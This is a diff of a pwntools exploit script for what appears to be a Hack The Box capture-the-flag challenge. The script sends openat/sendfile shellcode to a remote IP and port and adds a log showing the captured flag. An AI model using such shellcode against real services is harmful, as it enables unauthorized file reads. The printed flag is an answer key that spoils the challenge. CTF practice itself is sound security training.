@@ -28,7 +28,15 @@ ip, port = '165.227.231.233', 31102
 io = remote(ip, port)
 
 io.sendlineafter('[*] What do you want to do?', '9')
-payload = asm(shellcraft.openat(-100, 'flag.txt'))
-payload += asm(shellcraft.sendfile(1, 3, 0, 64))
+payload = asm(shellcraft.openat(-100, './flag.txt'))
+#payload += asm(shellcraft.sendfile(1, 3, 0, 64))    #in_fd may need to try...
+payload += asm(shellcraft.sendfile(1, 5, 0, 64))
 io.sendline(payload)
 print io.recvall()
+'''
++] Receiving all data: Done (30B)
+[DEBUG] Received 0x1d bytes:
+    'HTB{sh3llc0d3_45_4_b4ckd00r}\n'
+[*] Closed connection to 165.227.231.233 port 31102
+ HTB{sh3llc0d3_45_4_b4ckd00r}
+'''
